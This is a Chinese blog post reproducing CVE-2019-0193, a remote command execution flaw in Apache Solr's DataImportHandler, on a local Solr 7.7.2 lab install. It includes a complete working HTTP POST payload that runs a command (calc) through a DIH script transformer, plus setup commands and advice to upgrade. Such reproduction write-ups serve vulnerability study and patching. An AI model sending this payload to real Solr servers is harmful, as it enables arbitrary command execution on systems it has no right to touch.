# CVE-2019-0193：Apache Solr 远程命令执行漏洞复现 - 20181234 - 博客园

> 原文：[`www.cnblogs.com/ZYX-bk-412/p/14747717.html`](https://www.cnblogs.com/ZYX-bk-412/p/14747717.html)

# 漏洞背景

2019 年 8 月 1 日，Apache Solr 官方发布了 CVE-2019-0193 漏洞预警，漏洞危害评级为严重

# 影响范围

Apache Solr < 8.2.0

# 利用工具

burpsuite

# 漏洞原因　　

Apache solr 是一款开源的搜索服务器并且使用 java 语言开发；

主要的工作方式：用户通过 http 请求像搜索引擎发出索引条件，solr 对条件进行分词处理，根据分词结果查找索引，继而找到文档

在 Apache solr 的可选模块 DatalmportHandler 中的 DIH 配置是可以包含脚本，因此存在安全隐患，在 apache solr < 8.2.0 版本之前 DIH 配置中 dataconfig 可以被用户控制

# 漏洞复现

下载影响范围内的 Apache solr（我这里用的是 7.7.2 版本）解压在 cmd 运行

```
cd C:\Users\Eulalia\Desktop\solr-7.7.2 cd bin
solr -e dih
```

![](img/9399882ce47507d97b4efaccc2abd54c.png)

 浏览器访问 http://localhost:8983/solr 

![](img/cc75fb79d88fc42844dd5b5829bf801b.png)

 cmd 命令执行 curl http://localhost:8983/solr/admin/cores 可以获取 core 信息，根据获取的 core 信息中 name 信息构造 payload

![](img/8dc8e53882968b5f5a05b60e6f1ef2cd.png)

 payload 如下：

POST /solr/atom/dataimport HTTP/1.1
Host: 127.0.0.1:8983
Content-Length: 494
User-Agent: Mozilla/5.0
Content-type: application/x-www-form-urlencoded
Connection: close

command=full-import&verbose=false&clean=false&commit=true&debug=true&core=atom&name=dataimport&dataConfig=
<dataConfig>
<dataSource type="URLDataSource"/>
<script><![CDATA[
function poc(row){
var process= java.lang.Runtime.getRuntime();
process.exec("calc");
return row;
}
]]></script>
<document>
<entity name="stackoverflow"
url="https://stackoverflow.com/feeds/tag/solr"
processor="XPathEntityProcessor"
forEach="/feed"
transformer="script:poc" />
</document>
</dataConfig>

利用 burpsuite 发送可弹出计算器

![](img/921a43dafe82c69ec50f72e5bed15ba6.png)

# 漏洞修复

建议升级到最新版本

## 参考

[`www.apache.org/dyn/closer.lua/lucene/solr/7.7.2/solr-7.7.2.zip`](https://www.apache.org/dyn/closer.lua/lucene/solr/7.7.2/solr-7.7.2.zip)

https://www.cnblogs.com/paperpen/p/11328728.html